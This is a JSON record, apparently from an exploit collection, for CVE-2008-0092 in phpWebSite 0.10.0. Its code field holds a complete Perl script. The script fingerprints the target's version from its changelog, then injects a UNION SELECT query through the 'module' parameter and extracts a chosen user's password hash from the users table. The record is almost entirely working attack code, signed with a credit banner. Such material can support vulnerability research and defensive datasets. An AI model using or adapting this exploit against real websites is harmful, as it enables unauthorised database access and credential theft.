{
  "id": "1217",
  "title": "phpWebSite 0.10.0 - &#039;module&#039; SQL Injection",
  "cve": "CVE-2008-0092",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\nuse LWP::Simple;\r\n \r\n$serv     =  $ARGV[0]; \r\n$path     =  $ARGV[1]; \r\n$name     =  $ARGV[2];\r\n    \r\nsub usage\r\n { \r\n    print \"\\nUsage: $0 [server] [path] [username] \\n\"; \r\n    print \"sever    -  URL\\n\"; \r\n    print \"path     -  path to index.php\\n\"; \r\n    print \"username -  name register user\\n\\n\"; \r\n    exit ();}  \r\n \r\nsub work\r\n {\r\n    print qq(\r\n       --------------------------------- \r\n#==---[    phpWebSite SQL-injection     |\r\n#==---[   tested ob phpWebSite-0.10.0   |\r\n#==---[  Gr33tz: blf, 1dt.w0lf, Pengo,  |\r\n#==---[       edisan, foster, whice     |\r\n#==---[ (c)oded by x97Rang 2005 RST/GHC |\r\n#==---[        http://rst.void.ru       |\r\n#==---[          http://ghc.ru          |\r\n       ---------------------------------\\n\\n);&chv;&board}\r\n       \r\nsub chv     \r\n {\r\n    $ver  = sprintf(\"http://%s%s/docs/CHANGELOG.txt\",$serv,$path);\r\n    $getv = get \"$ver\";\r\nif ($getv =~ /(phpWebSite-)(\\d{1})\\.(\\d{1,2})\\.(\\d{1})/){print\"[*] Version: $1$2.$3.$4\\n\";}}  \r\n \r\nsub board \r\n {\r\n    $URL = sprintf(\"http://%s%s/index.php?module=%27+union+select+username,password+from+mod_users+where+username=%27$name%27/*\",$serv,$path);   \r\n    $content = get \"$URL\";\r\nif ($content =~ /(\\<b\\>Search\\&\\#160\\;)(\\w{32})(\\<\\/b\\>)/){&showh;}else{print \"... One of those days :)\\n\";}}\r\n \r\nsub showh\r\n {\r\n    print \"[*] User: $name\\n\";\r\n    print \"[*] Hash: $2\\n\\n\";}\r\n    \r\nif (@ARGV != 3){&usage;}else{&work;}\r\n\r\n# milw0rm.com [2005-09-15]",
  "url": "https://www.exploit-db.com/exploits/1217"
}